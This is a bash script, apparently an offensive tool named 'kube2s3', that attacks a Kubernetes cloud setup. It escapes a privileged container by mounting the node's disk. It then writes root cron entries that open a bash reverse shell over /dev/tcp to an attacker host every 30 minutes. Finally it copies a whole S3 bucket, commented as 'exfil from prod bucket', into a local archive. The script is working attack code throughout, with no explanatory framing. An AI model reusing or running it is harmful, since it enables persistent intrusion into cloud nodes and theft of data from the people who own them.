#!/bin/bash
SCRIPTNAME="kube2s3"
LOGFILE="/tmp/$SCRIPTNAME.log"
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

cat <<EOF >> $LOGFILE
REVERSE_SHELL_HOST=$REVERSE_SHELL_HOST
REVERSE_SHELL_PORT=$REVERSE_SHELL_PORT
EOF

log "starting..."
log "public ip: $(curl -s https://icanhazip.com)"
log "bucket name from env: $BUCKET_NAME"
log "creating local storage..."
LOCAL_STORE=/tmp/kube_bucket
if [ -f $LOCAL_STORE ]; then
    rm -rf $LOCAL_STORE
fi
mkdir -p $LOCAL_STORE
log "check aws identity..."
aws sts get-caller-identity 2>&1 | tee -a $LOGFILE

# escape privileged container to node with reverse shell
mkdir -p /mnt/node_filesystem
mount /dev/nvme0n1p1 /mnt/node_filesystem
mkdir -p /mnt/node_filesystem/var/spool/cron
echo -e "*/30 * * * * root TASK=iam2enum /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1 \n##################################################" > /mnt/node_filesystem/etc/cron.d/root
echo -e "*/30 * * * * TASK=iam2enum /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1\n##################################################" > /mnt/node_filesystem/var/spool/cron/root
chmod 600 /mnt/node_filesystem/var/spool/cron/root 
chown 0:0 /mnt/node_filesystem/var/spool/cron/root

# exfil from prod bucket
log "recursive copy from $BUCKET_NAME to $LOCAL_STORE..."
aws s3 cp s3://$BUCKET_NAME/ $LOCAL_STORE --recursive | tee -a $LOGFILE
tar -zcvf /tmp/kube_bucket.tgz $LOCAL_STORE | tee -a $LOGFILE
log "adding 5 minute delay before exiting..."
sleep 300
log "done."